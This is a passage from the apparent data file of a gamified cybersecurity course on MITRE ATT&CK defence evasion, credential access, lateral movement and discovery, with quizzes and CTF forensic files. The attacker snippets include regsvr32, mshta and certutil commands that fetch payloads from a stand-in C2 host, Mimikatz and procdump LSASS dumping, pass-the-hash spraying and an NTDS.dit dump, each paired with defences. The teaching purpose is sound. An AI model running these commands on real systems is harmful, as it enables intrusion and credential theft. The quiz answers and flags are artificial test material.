regsvr32.exe /s /n /u /i:http://c2.evil/payload.sct scrobj.dll

# ATTACKER: mshta execute remote HTA
mshta.exe http://c2.evil/payload.hta

# DEFENDER: Block LOLBin network access (Windows Firewall rule)
New-NetFirewallRule -DisplayName "Block certutil outbound" \`
  -Program "C:\\Windows\\System32\\certutil.exe" \`
  -Direction Outbound -Action Block

# DEFENDER: Sysmon — detect certutil network connections
# Event ID 3 (Network Connection) where Image = certutil.exe`,
        },
      },
      incident: {
        title: "BlackCat/ALPHV — BYOVD EDR Killer (2022–2023)",
        when: "2022–2023",
        where: "Global ransomware campaigns — MGM Resorts, Caesars Entertainment, Reddit, Western Digital",
        impact: "MGM $100M loss (10-day disruption); Caesars paid ~$15M ransom; HVCI and kernel driver blocklist accelerated as defenses; CrowdStrike adds kernel-level tamper protection",
        body: [
          "ALPHV (BlackCat), with affiliate Scattered Spider, blinded EDR before deploying ransomware:\n- They abused a vulnerable Dell driver (DBUtil_2_3.sys, known-vulnerable since 2021) to gain a kernel write from user space.\n- Overwriting EDR callback registrations let them terminate CrowdStrike Falcon, SentinelOne, and others — the essence of BYOVD: bring a signed-but-vulnerable driver instead of a zero-day.",
          "BYOVD is so dangerous because it fights EDR at EDR's own privilege level:\n- Standard agents self-protect via kernel callbacks, but BYOVD writes kernel memory directly and removes them.\n- The September 2023 MGM Resorts breach — $100M lost, 10 days of hotel/casino/online disruption — showed the impact at scale.",
          "MGM accelerated Windows kernel-driver defenses:\n- Microsoft expanded the Kernel Driver Blocklist (shipped via Defender updates) and enabled HVCI by default on new Windows 11 hardware.\n- CrowdStrike added HVCI-based tamper protection to Falcon; CISA's #StopRansomware advisory named BYOVD and made HVCI + driver allowlisting recommended controls — an EDR that can be killed from the kernel is false assurance.",
        ],
      },
      diagram: {
        nodes: [
          { label: "ALPHV/BlackCat", sub: "ransomware operator", type: "attacker" },
          { label: "BYOVD — DBUtil_2_3.sys", sub: "vulnerable Dell driver", type: "system" },
          { label: "CrowdStrike / SentinelOne", sub: "EDR killed from kernel", type: "victim" },
          { label: "Ransomware Deployed", sub: "undetected encryption", type: "result" },
        ],
      },
      timeline: [
        { year: 2019, event: "LOLBin catalog (lolbas-project.github.io) documents 100+ Windows binaries" },
        { year: 2022, event: "ALPHV BYOVD — EDR killed from kernel; MGM, Caesars hit", highlight: true },
        { year: 2023, event: "Microsoft HVCI enforcement grows — BYOVD defense at kernel level" },
        { year: 2024, event: "CrowdStrike Falcon adds kernel-level tamper protection against BYOVD" },
      ],
      keyTakeaways: [
        "LOLBins bypass application whitelisting — block their network access via firewall rules",
        "BYOVD kills EDR from the kernel — requires HVCI + driver allowlist to defend",
        "Block certutil/mshta/regsvr32 outbound network in enterprise firewall policy",
        "Monitor Sysmon Event 3 (network connection) for LOLBin binaries making outbound connections",
      ],
      references: [
        { title: "ATT&CK TA0005 Defense Evasion", url: "https://attack.mitre.org/tactics/TA0005/" },
        { title: "LOLBAS Project", url: "https://lolbas-project.github.io/" },
      ],
    },
    quiz: {
      questions: [
        { id: "mitre-07-q1", type: "Tactic", challenge: "Not being seen.", text: "What does the Defense Evasion tactic (TA0005) cover?", options: ["Techniques to avoid detection — obfuscation, log clearing, disabling defenses", "Gaining the first foothold", "Buying domains", "Encrypting data for ransom"], correctIndex: 0, explanation: "TA0005 is the broadest tactic — everything attackers do to stay hidden." },
        { id: "mitre-07-q2", type: "LOLBins", challenge: "Trusted tools, untrusted use.", text: "Why do LOLBins help with defense evasion?", options: ["They're signed Microsoft binaries, so application allowlisting trusts them", "They are invisible to the OS", "They require no execution", "They only run offline"], correctIndex: 0, explanation: "Signed, legitimate tools like mshta/regsvr32/certutil bypass allowlists." },
        { id: "mitre-07-q3", type: "Detection", challenge: "certutil phoning home.", text: "Why is certutil.exe making outbound HTTP connections suspicious?", options: ["certutil shouldn't make network connections — it indicates LOLBin abuse", "It's normal every boot", "It means the disk is full", "It indicates a Windows update"], correctIndex: 0, explanation: "certutil reaching the internet is a strong sign it's being abused to fetch payloads." },
        { id: "mitre-07-q4", type: "BYOVD", challenge: "Killing the EDR.", text: "What does a BYOVD (Bring Your Own Vulnerable Driver) attack enable?", options: ["Operating at kernel level to patch/disable EDR callbacks from the kernel", "Guessing passwords faster", "Sending phishing emails", "Encrypting one file"], correctIndex: 0, explanation: "A vulnerable signed driver gives kernel write access to neutralize EDR." },
        { id: "mitre-07-q5", type: "Real Incident", challenge: "ALPHV/BlackCat.", text: "ALPHV/BlackCat used a vulnerable Dell driver (DBUtil_2_3.sys) to…", options: ["Kill EDR sensors from the kernel before deploying ransomware", "Steal the building's keys", "Send spam", "Mine cryptocurrency only"], correctIndex: 0, explanation: "They disabled EDR via BYOVD, blinding defenders before encryption." },
        { id: "mitre-07-q6", type: "Defense", challenge: "Blocking BYOVD.", text: "Which defense specifically blocks BYOVD attacks?", options: ["HVCI (Hypervisor-Protected Code Integrity) with a strict driver allowlist", "A longer password", "Disabling the GUI", "More disk space"], correctIndex: 0, explanation: "HVCI + a driver blocklist/allowlist prevents loading known-vulnerable drivers." },
        { id: "mitre-07-q7", type: "Detection", challenge: "Sysmon to the rescue.", text: "Which Sysmon event helps catch LOLBins making unexpected network connections?", options: ["Event ID 3 (Network Connection), logging the process image path", "Event ID 4624 only", "Event ID 1102 only", "None"], correctIndex: 0, explanation: "Sysmon Event 3 reveals which process opened a connection, exposing LOLBin abuse." },
        { id: "mitre-07-q8", type: "Concept", challenge: "Why it's the biggest tactic.", text: "Defense Evasion is the largest ATT&CK tactic because…", options: ["Avoiding detection touches almost every part of an intrusion", "It only has one technique", "Nobody uses it", "It's purely theoretical"], correctIndex: 0, explanation: "Staying hidden spans obfuscation, injection, log tampering, impairing defenses, and more." },
      ],
    },
    ctf: {
      scenario: "A ransomware operator used defense evasion before deploying the payload. Three forensic artifacts show the evasion chain. Collect the fragments.",
      hint: "Evasion artifacts are in /evasion-forensics. Read each file.",
      hints: [
        "List /evasion-forensics to find the files.",
        "The LOLBin log contains the first fragment.",
        "Read byovd.log and edrkill.txt for the remaining fragments.",
      ],
      files: {
        "/evasion-forensics/lolbin-log.txt": `# LOLBin Execution Log
# Timestamp: 2024-11-15 04:01:22 UTC

certutil.exe -urlcache -split -f http://185.220.101.42/stage3.b64 C:\\Temp\\s3.b64
certutil.exe -decode C:\\Temp\\s3.b64 C:\\Temp\\loader.exe
regsvr32.exe /s /n /u /i:http://185.220.101.42/payload.sct scrobj.dll

Fragment-1: FLAG{TA0005_`,
        "/evasion-forensics/byovd.log": `# BYOVD Driver Load Log
# DBUtil_2_3.sys (Dell vulnerable driver — CVE-2021-21551)

sc.exe create DBUtil_2_3 type=kernel binPath=C:\\Temp\\DBUtil_2_3.sys
sc.exe start DBUtil_2_3

# Driver loaded successfully — kernel write primitives available
# Proceeding to patch EDR kernel callbacks

Fragment-2: 3V4S10N_`,
        "/evasion-forensics/edrkill.txt": `# EDR Kill Log
# Using DBUtil_2_3 kernel write to NULL EDR callbacks

Target: CrowdStrike Falcon sensor (csagent.sys)
Action: Overwrite PsSetCreateProcessNotifyRoutineEx callback → NULL
Result: Falcon process monitoring disabled

Target: SentinelOne agent (sentinelone.sys)
Action: Overwrite callback table
Result: Agent disabled

Ransomware deployment: CLEAR — proceeding with encryption

Fragment-3: BYOVD}`,
      },
      dirs: {
        "/": [{ name: "evasion-forensics", isDir: true }],
        "/evasion-forensics": [
          { name: "lolbin-log.txt", isDir: false },
          { name: "byovd.log", isDir: false },
          { name: "edrkill.txt", isDir: false },
        ],
      },
      fragments: [
        { trigger: "/evasion-forensics/lolbin-log.txt", value: "FLAG{TA0005_", label: "Fragment 1 — LOLBin Log" },
        { trigger: "/evasion-forensics/byovd.log", value: "3V4S10N_", label: "Fragment 2 — BYOVD Log" },
        { trigger: "/evasion-forensics/edrkill.txt", value: "BYOVD}", label: "Fragment 3 — EDR Kill" },
      ],
    },
  },

  // ─── mitre-08: Credential Access ─────────────────────────────────────────────
  {
    epochId: "mitre",
    wonder: { name: "NotPetya Attack", location: "Kyiv, Ukraine", era: "2017", emoji: "🔑" },
    id: "mitre-08",
    order: 8,
    title: "The Key Thief",
    subtitle: "TA0006 Credential Access — Mimikatz and the credential harvesting chain",
    category: "cybersecurity",
    xp: 200,
    badge: { id: "mitre-badge-08", name: "Credential Harvester", emoji: "🔑" },
    challengeType: "ctf",
    info: {
      tagline: "With valid credentials, you're not an attacker — you're an authorized user.",
      year: 2017,
      overview: [
        "Credential Access (TA0006) is the theft of usernames and passwords — an attacker's most powerful tool:\n- Valid credentials enable lateral movement, escalation, and persistence at once.\n- And they do it while generating only legitimate-looking authentication events.",
        "The core techniques pull credentials from memory, tickets, files, and keystrokes:\n- T1003 (OS Credential Dumping) — Mimikatz reads NTLM hashes and plaintext from LSASS memory.\n- T1558 (Steal or Forge Kerberos Tickets) — Pass-the-Ticket, Golden Ticket, Kerberoasting.\n- T1552 (Unsecured Credentials) — passwords hardcoded in scripts, configs, and env vars; T1056 (Input Capture) — keylogging.",
        "Mimikatz (T1003.001) is the workhorse:\n- It extracts NTLM hashes from LSASS, and plaintext passwords where legacy WDigest is enabled.\n- Modern Windows disables WDigest by default — but attackers can re-enable it with a registry tweak.",
      ],
      technical: {
        title: "LSASS Credential Dumping Detection",
        body: [
          "Two settings make LSASS far harder to loot:\n- Credential Guard (Windows 10+/Server 2016+) moves LSASS into a VBS enclave Mimikatz can't read.\n- RunAsPPL (Protected Process Light) restricts LSASS memory access to signed processes only.",
          "Detection watches who touches LSASS:\n- Sysmon Event ID 10 (Process Access) on lsass.exe with a PROCESS_VM_READ (0x10) mask flags dumping.\n- Alert on any non-Microsoft process reading LSASS; EDR spots dumping tools by access pattern even when renamed.",
        ],
        codeExample: {
          label: "Credential dumping and protection",
          code: `# ATTACKER: Mimikatz LSASS dump
privilege::debug
sekurlsa::logonpasswords  # Dump plaintext + NTLM hashes from LSASS

# ATTACKER: Task Manager / ProcDump (T1003.001 variant)
procdump.exe -ma lsass.exe lsass.dmp
# Then parse offline with Mimikatz or pypykatz

# DEFENDER: Enable RunAsPPL (requires reboot)
reg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa" /v RunAsPPL /t REG_DWORD /d 1

# DEFENDER: Enable Credential Guard via Device Guard
# Group Policy: Computer Config → Admin Templates → System → Device Guard
# → Turn On Virtualization Based Security → Credential Guard: Enabled with UEFI lock

# DEFENDER: Hunt LSASS access (Sysmon Event ID 10)
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" | Where-Object {
  $_.Id -eq 10 -and $_.Message -match "lsass.exe" -and $_.Message -match "0x1010"
}`,
        },
      },
      incident: {
        title: "NotPetya — Mimikatz + EternalBlue Credential Cascade (2017)",
        when: "June 27, 2017",
        where: "Ukraine → Global — Maersk, Merck, FedEx, Mondelez, Reckitt Benckiser",
        impact: "$10B+ global damage; Maersk 45,000 PCs wiped; Credential Guard + Windows LAPS deployment accelerated",
        body: [
          "NotPetya paired credential theft with a worm exploit for spread:\n- A Mimikatz-style module dumped LSASS credentials on the first host, then PsExec reused them.\n- Where credentials failed, it fell back to EternalBlue (MS17-010) — the same NSA exploit WannaCry used weeks earlier — wiping Maersk's 45,000 PCs and 4,000 servers in hours.",
          "The credential cascade was the force multiplier:\n- One host where an admin had recently logged on yielded credentials reaching every system that admin had touched.\n- A handful of shared domain-admin accounts logged into thousands of machines meant a single dump could own the whole fleet in minutes.",
          "Mimikatz's origin and NotPetya's damage reshaped credential hygiene:\n- Benjamin Delpy built Mimikatz as a PoC after finding Windows stored plaintext WDigest creds in LSASS; the 2012 fix disabled WDigest but wasn't retroactive, so most 2017 systems still had it on.\n- NotPetya made Credential Guard a NIST SP 800-53 rev 5 baseline and pushed Microsoft to ship Windows LAPS natively in 2023, targeting the local-admin reuse it exploited.",
        ],
      },
      diagram: {
        nodes: [
          { label: "NotPetya / Sandworm", sub: "GRU Unit 74455", type: "attacker" },
          { label: "Mimikatz + EternalBlue", sub: "credential dump + exploit", type: "system" },
          { label: "Maersk / FedEx / Merck", sub: "admin credential cascade", type: "victim" },
          { label: "$10B Global Damage", sub: "wiper disguised as ransomware", type: "result" },
        ],
      },
      timeline: [
        { year: 2011, event: "Mimikatz released by Benjamin Delpy — LSASS credential extraction" },
        { year: 2017, event: "NotPetya — Mimikatz + EternalBlue causes $10B damage in hours", highlight: true },
        { year: 2019, event: "Windows Credential Guard reaches majority enterprise adoption" },
        { year: 2022, event: "RunAsPPL becomes Microsoft recommended baseline for all Windows endpoints" },
      ],
      keyTakeaways: [
        "Enable Credential Guard + RunAsPPL — makes Mimikatz-style dumping impossible",
        "Disable WDigest (reg key) — prevents plaintext passwords in LSASS on legacy systems",
        "Monitor Sysmon Event 10 (lsass.exe process access) from non-Microsoft processes",
        "Admin credential reuse is the multiplier — use LAPS for unique local admin passwords",
      ],
      references: [
        { title: "ATT&CK T1003.001 LSASS Memory", url: "https://attack.mitre.org/techniques/T1003/001/" },
        { title: "Mimikatz GitHub", url: "https://github.com/gentilkiwi/mimikatz" },
      ],
    },
    quiz: {
      questions: [
        { id: "mitre-08-q1", type: "Tactic", challenge: "Stealing the keys.", text: "What does the Credential Access tactic (TA0006) cover?", options: ["Techniques for stealing account names and passwords", "Encrypting files", "Buying domains", "Scanning the internet"], correctIndex: 0, explanation: "Valid credentials let attackers move and act while looking like authorized users." },
        { id: "mitre-08-q2", type: "Mimikatz", challenge: "The famous tool.", text: "Mimikatz's sekurlsa::logonpasswords dumps credentials from which process?", options: ["LSASS (Local Security Authority Subsystem Service)", "explorer.exe", "svchost generic", "the kernel scheduler"], correctIndex: 0, explanation: "LSASS holds authentication secrets in memory; Mimikatz reads them from it." },
        { id: "mitre-08-q3", type: "Defense", challenge: "Locking the vault.", text: "What does Windows Credential Guard do?", options: ["Moves LSASS secrets into a VBS enclave Mimikatz can't read", "Deletes all passwords", "Speeds up login", "Blocks email"], correctIndex: 0, explanation: "Virtualization-Based Security isolates credentials from standard memory dumping." },
        { id: "mitre-08-q4", type: "Real Incident", challenge: "NotPetya's multiplier.", text: "Why was admin credential reuse so devastating in NotPetya?", options: ["Dumping one cached admin credential gave access to every system that admin had touched", "It deleted the internet", "It guessed all passwords", "It only hit one PC"], correctIndex: 0, explanation: "A single dumped admin credential cascaded across the whole fleet within minutes." },
        { id: "mitre-08-q5", type: "Detection", challenge: "Who's reading LSASS?", text: "Which signal best detects credential dumping?", options: ["A non-Microsoft process accessing lsass.exe (Sysmon Event 10, e.g. mask 0x1010)", "A user logging in normally", "A scheduled Windows update", "High CPU on idle"], correctIndex: 0, explanation: "Unexpected process access to LSASS memory is a high-fidelity dumping indicator." },
        { id: "mitre-08-q6", type: "Legacy Risk", challenge: "Plaintext peril.", text: "What is the risk of WDigest being enabled?", options: ["It stores plaintext passwords in LSASS memory for dumping", "It speeds up the network", "It encrypts the disk", "It blocks phishing"], correctIndex: 0, explanation: "WDigest (off by default on modern Windows) keeps plaintext creds in memory; attackers re-enable it." },
        { id: "mitre-08-q7", type: "Defense", challenge: "Protect the process.", text: "What does enabling RunAsPPL for LSASS accomplish?", options: ["Only signed processes can read LSASS memory, blocking standard dumping", "It disables logins", "It removes admins", "It deletes LSASS"], correctIndex: 0, explanation: "Protected Process Light shields LSASS from unsigned tools like Mimikatz." },
        { id: "mitre-08-q8", type: "Concept", challenge: "Why creds are king.", text: "Why are stolen valid credentials so powerful?", options: ["They let the attacker act as an authorized user, generating legitimate-looking events", "They crash the system", "They're useless without exploits", "They only work once"], correctIndex: 0, explanation: "'With valid credentials, you're not an attacker — you're an authorized user.'" },
      ],
    },
    ctf: {
      scenario: "IR team recovered credential dumping artifacts from a compromised domain controller. Three files contain the harvested credential data and detection evidence. Collect the flag fragments.",
      hint: "Credential artifacts are in /cred-dump. Read each evidence file.",
      hints: [
        "List /cred-dump to find the artifact files.",
        "The Mimikatz output contains the first fragment.",
        "Read the NTLM dump and detection log for the remaining fragments.",
      ],
      files: {
        "/cred-dump/mimikatz-output.txt": `# Mimikatz sekurlsa::logonpasswords output

Authentication Id: 0 ; 1234567 (00000000:0012d687)
Session           : Interactive from 1
User Name         : jsmith
Domain            : ACME
Logon Server      : DC01
Logon Time        : 11/15/2024 3:00:12 AM
SID               : S-1-5-21-...
  msv:
    [00000003] Primary — NTLM: 31d6cfe0d16ae931b73c59d7e0c089c0
  wdigest: (disabled)

Fragment-1: FLAG{TA0006_`,
        "/cred-dump/ntlm-hashes.txt": `# Extracted NTLM Hashes — DC01 dump

Administrator:500:aad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
jsmith:1103:aad3b435b51404ee:7f4a2f0a3b5c6d1e2f3a4b5c6d7e8f9a:::
da_svc:1234:aad3b435b51404ee:a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6:::

Fragment-2: M1M1K4TZ_`,
        "/cred-dump/sysmon-detection.txt": `# Sysmon Event ID 10 — LSASS Process Access
# ALERT: Non-Microsoft process accessing lsass.exe

SourceImage: C:\\Temp\\m64.exe (renamed Mimikatz)
TargetImage: C:\\Windows\\System32\\lsass.exe
GrantedAccess: 0x1010 (PROCESS_VM_READ | PROCESS_QUERY_INFORMATION)
CallTrace: ntdll.dll|kernelbase.dll|m64.exe

# Detection fired — EDR blocked LSASS read attempt
# Attacker pivoted to procdump.exe (signed Microsoft binary) — bypassed block

Fragment-3: DUMP}`,
      },
      dirs: {
        "/": [{ name: "cred-dump", isDir: true }],
        "/cred-dump": [
          { name: "mimikatz-output.txt", isDir: false },
          { name: "ntlm-hashes.txt", isDir: false },
          { name: "sysmon-detection.txt", isDir: false },
        ],
      },
      fragments: [
        { trigger: "/cred-dump/mimikatz-output.txt", value: "FLAG{TA0006_", label: "Fragment 1 — Mimikatz Output" },
        { trigger: "/cred-dump/ntlm-hashes.txt", value: "M1M1K4TZ_", label: "Fragment 2 — NTLM Hashes" },
        { trigger: "/cred-dump/sysmon-detection.txt", value: "DUMP}", label: "Fragment 3 — Sysmon Detection" },
      ],
    },
  },

  // ─── mitre-09: Lateral Movement ──────────────────────────────────────────────
  {
    epochId: "mitre",
    wonder: { name: "Colonial Pipeline HQ", location: "Alpharetta, Georgia", era: "2021", emoji: "🌐" },
    id: "mitre-09",
    order: 9,
    title: "The Spreader",
    subtitle: "TA0008 Lateral Movement — Pass-the-Hash across the network",
    category: "cybersecurity",
    xp: 200,
    badge: { id: "mitre-badge-09", name: "Lateral Mover", emoji: "🌐" },
    challengeType: "ctf",
    info: {
      tagline: "Lateral movement turns a single compromised host into a compromised network.",
      year: 2021,
      overview: [
        "Lateral Movement (TA0008) is how attackers spread from the first foothold to the prizes:\n- The targets are domain controllers, file servers, databases, backups, and OT/ICS systems.\n- Each hop expands access toward the high-value systems.",
        "The core techniques reuse stolen authentication rather than re-exploit:\n- T1550.002 (Pass-the-Hash) — authenticate with an NTLM hash directly.\n- T1550.003 (Pass-the-Ticket) — replay stolen Kerberos tickets.\n- T1021.001 RDP, T1021.002 SMB/admin shares, and T1080 (Taint Shared Content) — poison file shares to spread.",
        "Pass-the-Hash is especially potent because it skips cracking entirely:\n- An admin NTLM hash authenticates to any system where that account has admin rights.\n- Tools like net use, wmiexec, or Impacket's psexec.py do the rest.",
      ],
      technical: {
        title: "Lateral Movement Detection — Network and Host",
        body: [
          "Network telemetry exposes the spread pattern:\n- One source IP authenticating to many systems in a short window, or SMB to ADMIN$/C$ shares off-hours.\n- Authentication to systems the source account has never used; NDR tools like Darktrace flag these anomalies.",
          "Host logs pin down Pass-the-Hash:\n- Event ID 4624 (Logon Success) with Logon Type 3 and NTLM (NtLmSsp) auth signals PtH — network logons should be Kerberos.\n- Sysmon Event ID 3 from net.exe or wmiexec to internal hosts confirms the movement.",
        ],
        codeExample: {
          label: "Pass-the-Hash detection and defense",
          code: `# ATTACKER: Pass-the-Hash via Impacket
python3 psexec.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 acme/Administrator@192.168.1.10

# ATTACKER: PtH via CrackMapExec — spray across subnet
crackmapexec smb 192.168.1.0/24 -u Administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0

# DEFENDER: Detect PtH — Event ID 4624, Logon Type 3, NTLM auth
Get-WinEvent -LogName Security | Where-Object {
  $_.Id -eq 4624 -and
  $_.Message -match "Logon Type:\\s+3" -and
  $_.Message -match "NTLM"
}

# DEFENDER: Restrict NTLM — force Kerberos for all network auth
# Group Policy: Network Security — Restrict NTLM: Incoming NTLM Traffic → Deny All
# This forces all lateral movement to use Kerberos (detectable via Event 4768/4769)`,
        },
      },
      incident: {
        title: "Colonial Pipeline — DarkSide Ransomware Lateral Movement (2021)",
        when: "May 7, 2021",
        where: "Colonial Pipeline, Alpharetta, Georgia — 45% of US East Coast fuel supply",
        impact: "$4.4M ransom paid; 5-day pipeline shutdown; TSA Security Directives mandate MFA + OT/IT segmentation for US pipeline operators",
        body: [
          "DarkSide reached Colonial Pipeline through one weak door:\n- A compromised VPN account with a leaked password and no MFA gave initial access.\n- From there, stolen credentials carried them laterally to the billing and business systems, where they deployed ransomware.",
          "The blast radius came from missing segmentation and stale access:\n- Colonial preemptively shut the 5,500-mile pipeline, fearing the OT network was also exposed — creating the East Coast fuel shortage.\n- The VPN account was an inactive but still-enabled login belonging to a former employee; movement from it took hours, not days.",
          "Colonial drove the first mandatory US pipeline cyber rules:\n- TSA Security Directives (2021) required MFA for remote access, IT/OT segmentation, and annual assessments.\n- DOJ clawed back $2.3M of the $4.4M ransom in its first major ransomware crypto seizure, and CISA's ED 22-02 mandated MFA across federal civilian agencies.",
        ],
      },
      diagram: {
        nodes: [
          { label: "DarkSide", sub: "RaaS affiliate, Eastern Europe", type: "attacker" },
          { label: "Stolen VPN Creds + PtH", sub: "no MFA, NTLM lateral movement", type: "system" },
          { label: "Colonial Pipeline IT Network", sub: "billing and business systems", type: "victim" },
          { label: "Pipeline Shutdown", sub: "$4.4M ransom + 5-day outage", type: "result" },
        ],
      },
      timeline: [
        { year: 2017, event: "NotPetya demonstrates catastrophic lateral movement at global scale" },
        { year: 2021, event: "Colonial Pipeline — VPN + PtH lateral movement shuts East Coast fuel", highlight: true },
        { year: 2022, event: "CISA Emergency Directive — MFA required for all remote access in FCEB" },
        { year: 2023, event: "Zero Trust segmentation prevents lateral movement in >60% of enterprises" },
      ],
      keyTakeaways: [
        "Pass-the-Hash uses NTLM hashes directly — no password cracking needed",
        "Restrict NTLM: force Kerberos for all network auth — makes PtH fail",
        "Event ID 4624 Logon Type 3 + NtLmSsp = PtH indicator",
        "Network segmentation + MFA on VPN stops lateral movement at the perimeter",
      ],
      references: [
        { title: "ATT&CK T1550.002 Pass-the-Hash", url: "https://attack.mitre.org/techniques/T1550/002/" },
        { title: "Colonial Pipeline CISA Report", url: "https://www.cisa.gov/news-events/news/attack-colonial-pipeline-what-we-know" },
      ],
    },
    quiz: {
      questions: [
        { id: "mitre-09-q1", type: "Tactic", challenge: "Spreading out.", text: "What does the Lateral Movement tactic (TA0008) achieve?", options: ["Moving from the initial foothold to other systems in the network", "Gaining the first foothold", "Encrypting files", "Buying domains"], correctIndex: 0, explanation: "It turns one compromised host into access across the network toward high-value targets." },
        { id: "mitre-09-q2", type: "Pass-the-Hash", challenge: "No cracking needed.", text: "In Pass-the-Hash (T1550.002), what does the attacker authenticate with?", options: ["The NTLM hash itself — no plaintext password required", "A cracked password only", "A fingerprint", "A one-time code"], correctIndex: 0, explanation: "PtH uses the hash directly to authenticate where the account has rights." },
        { id: "mitre-09-q3", type: "Detection", challenge: "A suspicious logon.", text: "Why is Event 4624 Logon Type 3 using NTLM a red flag?", options: ["Modern network logons should use Kerberos; pure NTLM network logons suggest PtH", "It means the user is an admin", "It's always normal", "It indicates a patch"], correctIndex: 0, explanation: "NTLM network authentication where Kerberos is expected is a classic PtH indicator." },
        { id: "mitre-09-q4", type: "Real Incident", challenge: "Colonial Pipeline.", text: "What single control would most likely have stopped the 2021 Colonial Pipeline intrusion?", options: ["MFA on the compromised VPN account", "A faster pipeline", "More fuel reserves", "A new logo"], correctIndex: 0, explanation: "The breach started with a leaked VPN password on an account lacking MFA." },
        { id: "mitre-09-q5", type: "Defense", challenge: "Kill the technique.", text: "How does forcing Kerberos (restricting NTLM) defeat Pass-the-Hash?", options: ["PtH relies on NTLM; eliminating NTLM removes the attack path", "It deletes all hashes", "It speeds up logins", "It blocks email"], correctIndex: 0, explanation: "PtH only works against NTLM, so requiring Kerberos closes it." },
        { id: "mitre-09-q6", type: "Tooling", challenge: "Spraying a hash.", text: "What does a successful CrackMapExec response when spraying a hash across a subnet indicate?", options: ["The hash is valid and the account has admin rights on that host", "The network is offline", "The password expired", "Nothing"], correctIndex: 0, explanation: "A success means that credential grants admin access on the responding host." },
        { id: "mitre-09-q7", type: "Defense", challenge: "Walls inside.", text: "Besides MFA, what limits lateral movement?", options: ["Network segmentation between zones (e.g. IT and OT)", "Brighter monitors", "More disk space", "Longer usernames"], correctIndex: 0, explanation: "Segmentation contains an intruder to one zone instead of the whole network." },
        { id: "mitre-09-q8", type: "Concept", challenge: "The amplifier.", text: "Why is lateral movement a force multiplier?", options: ["It turns a single compromised host into a compromised network", "It only affects one PC", "It encrypts nothing", "It alerts defenders automatically"], correctIndex: 0, explanation: "Reaching domain controllers and servers from one foothold is how small breaches become catastrophic." },
      ],
    },
    ctf: {
      scenario: "An attacker moved laterally through the network after gaining initial access. Three network logs document the lateral movement chain. Collect the flag fragments.",
      hint: "Lateral movement logs are in /lateral-move. Read each log file.",
      hints: [
        "List /lateral-move to find the log files.",
        "The PtH log contains the first fragment.",
        "Read smb-spread.log and dc-access.log for the remaining fragments.",
      ],
      files: {
        "/lateral-move/pth-log.txt": `# Pass-the-Hash Authentication Log
# Event ID 4624, Logon Type 3, NtLmSsp

Source IP: 192.168.1.47 (WORKSTATION-047, initial compromise)
Targets and results:
  192.168.1.10 (FS01)  — NTLM hash Admin: SUCCESS
  192.168.1.20 (FS02)  — NTLM hash Admin: SUCCESS
  192.168.1.30 (DB01)  — NTLM hash Admin: SUCCESS
  192.168.1.1  (DC01)  — NTLM hash Admin: SUCCESS

Fragment-1: FLAG{TA0008_`,
        "/lateral-move/smb-spread.log": `# SMB Admin Share Access Log
# Source: 192.168.1.47 using stolen admin hash

\\\\FS01\\ADMIN$    — copy payload.exe → C:\\Windows\\Temp\\svc.exe
\\\\FS02\\C$       — copy payload.exe → C:\\ProgramData\\svc.exe
\\\\DB01\\ADMIN$   — copy payload.exe → C:\\Windows\\Temp\\svc.exe

# PsExec remote execution to trigger payload on each host

Fragment-2: L4T_MOV_`,
        "/lateral-move/dc-access.log": `# Domain Controller Access — CRITICAL
# 192.168.1.47 → 192.168.1.1 (DC01) via PtH

Session: jsmith (DA) — NTLM network logon
Commands:
  nltest /dclist:acme.local          (domain recon)
  net group "Domain Admins" /domain  (identify DA accounts)
  ntdsutil "ac i ntds" "ifm" "create full C:\\Temp\\ntds" q q (NTDS.dit dump)

Fragment-3: PTH}`,
      },
      dirs: {
        "/": [{ name: "lateral-move", isDir: true }],
        "/lateral-move": [
          { name: "pth-log.txt", isDir: false },
          { name: "smb-spread.log", isDir: false },
          { name: "dc-access.log", isDir: false },
        ],
      },
      fragments: [
        { trigger: "/lateral-move/pth-log.txt", value: "FLAG{TA0008_", label: "Fragment 1 — PtH Log" },
        { trigger: "/lateral-move/smb-spread.log", value: "L4T_MOV_", label: "Fragment 2 — SMB Spread" },
        { trigger: "/lateral-move/dc-access.log", value: "PTH}", label: "Fragment 3 — DC Access" },
      ],
    },
  },

  // ─── mitre-10: Discovery + Collection ────────────────────────────────────────
  {
    epochId: "mitre",
    wonder: { name: "APT29 Operations", location: "Eastern Europe", era: "2020–Present", emoji: "🔎" },
    id: "mitre-10",
    order: 10,
    title: "The Cartographer",
    subtitle: "TA0007 + TA0009 Discovery and Collection — mapping and harvesting",
    category: "cybersecurity",
    xp: 200,
    badge: { id: "mitre-badge-10", name: "Intelligence Collector", emoji: "🔎" },
    challengeType: "ctf",
    info: {
      tagline: "Discovery maps the treasure. Collection bags it. Both happen before exfiltration.",
      year: 2020,
      overview: [
        "Discovery (TA0007) maps what exists on the compromised network, usually in parallel with collection:\n- T1083 (File and Directory Discovery) and T1082 (System Information Discovery).\n- T1016 (System Network Configuration) and T1018 (Remote System Discovery) — scanning from inside the network.",
        "Collection (TA0009) then harvests the valuable data once it's located:\n- T1005 (Data from Local System) and T1039 (Data from Network Shared Drive).\n- T1114 (Email Collection) exports mailboxes; T1119 (Automated Collection) scripts archive files matching patterns like *.docx, *.xlsx, *.pst.",
        "APTs invest heavily in this phase before they ever exfiltrate:\n- They learn the network topology and locate the high-value data repositories.\n- They stage data as small, compressed, encrypted archives that are less likely to trip DLP.",
      ],
      technical: {
        title: "Discovery and Collection Patterns",
        body: [
          "Internal discovery uses built-in commands that leave process traces:\n- `net view /domain`, `nltest /dclist`, `arp -a`, and netscan map the internal topology.\n- Detect via Sysmon process-creation events for net.exe, nltest.exe, and arp.exe from unusual accounts.",
          "Automated collection has a recognizable rhythm:\n- Scripts grab document types (*.docx, *.xlsx, *.pptx, *.pdf), compress them with 7zip/WinRAR, and stage them in temp.\n- Detect via DLP rules on file-access spikes, compression-utility execution, and large reads from unusual accounts.",
        ],
        codeExample: {
          label: "Discovery and collection automation (attacker pattern + detection)",
          code: `# ATTACKER: Network discovery
net view /domain              # List domain computers
nltest /dclist:acme.local     # Find domain controllers
nmap -sn 192.168.0.0/16      # Sweep internal network ranges

# ATTACKER: Automated file collection (PowerShell)
Get-ChildItem -Path \\\\fileserver\\shares -Recurse -Include *.docx,*.xlsx,*.pdf |
